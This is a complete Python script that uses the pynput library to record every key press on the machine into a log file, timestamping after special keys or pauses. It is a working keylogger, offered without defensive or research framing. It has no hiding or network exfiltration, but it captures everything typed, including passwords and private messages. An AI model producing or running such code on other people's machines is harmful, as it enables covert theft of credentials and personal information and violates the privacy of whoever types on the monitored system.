from pynput import keyboard
import logging
import os
import sys


class Formatter(logging.Formatter):
    prev_time = -1
    prev_is_spl = False

    def format(self, record):
        curr_time = record.created
        # create a new timestamp if -
        # the previous or current key pressed is a special key
        # or if it has been more than 2 seconds since the last key was pressed
        if self.prev_time == -1 or self.prev_is_spl \
           or record.__dict__['is_spl'] or curr_time - self.prev_time > 2:
            self._style._fmt = "\n%(asctime)s : %(message)s"
        else:
            self._style._fmt = "%(message)s"
        self.prev_time = curr_time
        self.prev_is_spl = record.__dict__['is_spl']
        s = super().format(record)
        return s


class FileHandler(logging.FileHandler):
    terminator = ""


def on_press(key):
    if isinstance(key, keyboard.Key):
        logging.info("%s", key, extra={'is_spl': True})
    else:
        logging.info("%s", key.char, extra={'is_spl': False})


# log input for all key presses
def on_release(key):
    return True


def get_filename():
    filename = "keyboard.log"
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        dirname = os.path.dirname(file_path)
        if os.path.isdir(dirname) or dirname == "":
            filename = file_path
        else:
            print("Invalid path! Try again")
            exit(-1)
    return filename


def main():
    filename = get_filename()
    # configure loggging parameters
    logger = logging.getLogger()
    handler = FileHandler(filename)
    handler.setFormatter(Formatter())
    logger.setLevel(logging.DEBUG)
    logger.addHandler(handler)
    # start logging
    with keyboard.Listener(on_press=on_press, on_release=on_release) \
         as listener:
        listener.join()


if __name__ == "__main__":
    main()
